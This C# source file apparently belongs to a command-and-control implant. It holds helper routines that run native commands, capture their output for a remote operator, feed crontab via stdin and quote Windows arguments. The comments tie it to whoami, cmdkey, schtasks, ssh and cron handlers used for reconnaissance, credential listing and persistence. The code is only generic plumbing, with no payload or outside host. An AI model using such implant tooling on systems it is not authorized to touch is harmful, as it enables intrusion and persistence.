using System.Diagnostics;
using Rod.V1;

namespace Rod.Implant.Internal;

// The native-tool helpers the documented-surface handlers share (whoami,
// cmdkey, schtasks, ssh, cron): run a platform command and capture its
// combined output, or quote an argument the Windows native tools decode.
// Always compiled -- the handler sources that call it trim independently, so
// the shared plumbing lives outside their files (the Chunking pattern).

/// <summary>
/// Runs a platform command with its output captured, the shape every
/// one-shot native-tool verb reports through.
/// </summary>
internal static class NativeCommand
{
    /// <summary>
    /// Runs one command, capturing combined stdout/stderr. A non-zero exit is
    /// Failed with the output captured so the operator sees the cause; a start
    /// failure or crash is Failed with the exception message.
    /// </summary>
    public static (TaskOutcome Outcome, string Output) RunCaptured(string fileName, string arguments)
    {
        var psi = new ProcessStartInfo
        {
            FileName = fileName,
            Arguments = arguments,
            UseShellExecute = false,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            CreateNoWindow = true,
        };
        try
        {
            using var process = Process.Start(psi);
            if (process is null)
                return (TaskOutcome.Failed, $"failed to start {fileName}");
            var stdout = process.StandardOutput.ReadToEnd();
            var stderr = process.StandardError.ReadToEnd();
            process.WaitForExit();
            var output = ComposeOutput(stdout, stderr);
            if (process.ExitCode != 0)
                return (TaskOutcome.Failed, output.Length > 0 ? output : $"exit code {process.ExitCode}");
            return (TaskOutcome.Succeeded, output);
        }
        catch (Exception ex)
        {
            return (TaskOutcome.Failed, ex.Message);
        }
    }

    /// <summary>
    /// The stdin-feeding variant, the cron path's shape: the new crontab
    /// arrives through <c>crontab -</c> rather than an argument.
    /// </summary>
    public static (TaskOutcome Outcome, string Output) RunCapturedWithStdin(
        string fileName, string arguments, string stdin)
    {
        var psi = new ProcessStartInfo
        {
            FileName = fileName,
            Arguments = arguments,
            UseShellExecute = false,
            RedirectStandardInput = true,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            CreateNoWindow = true,
        };
        try
        {
            using var process = Process.Start(psi);
            if (process is null)
                return (TaskOutcome.Failed, $"failed to start {fileName}");
            process.StandardInput.Write(stdin);
            process.StandardInput.Close();
            var stdout = process.StandardOutput.ReadToEnd();
            var stderr = process.StandardError.ReadToEnd();
            process.WaitForExit();
            var output = ComposeOutput(stdout, stderr);
            if (process.ExitCode != 0)
                return (TaskOutcome.Failed, output.Length > 0 ? output : $"exit code {process.ExitCode}");
            return (TaskOutcome.Succeeded, output);
        }
        catch (Exception ex)
        {
            return (TaskOutcome.Failed, ex.Message);
        }
    }

    /// <summary>
    /// Joins stdout and stderr on a newline so a Failed outcome shows both,
    /// and a Succeeded outcome carries whatever the tool printed.
    /// </summary>
    public static string ComposeOutput(string stdout, string stderr)
    {
        if (stdout.Length == 0)
            return stderr;
        if (stderr.Length == 0)
            return stdout;
        return stdout + "\n" + stderr;
    }

    /// <summary>
    /// Quotes one native-tool argument value: wrapped in double quotes with
    /// any embedded quote doubled, the form CommandLineToArgvW decodes back to
    /// the original string.
    /// </summary>
    public static string Quote(string value)
        => $"\"{value.Replace("\"", "\"\"", StringComparison.Ordinal)}\"";
}
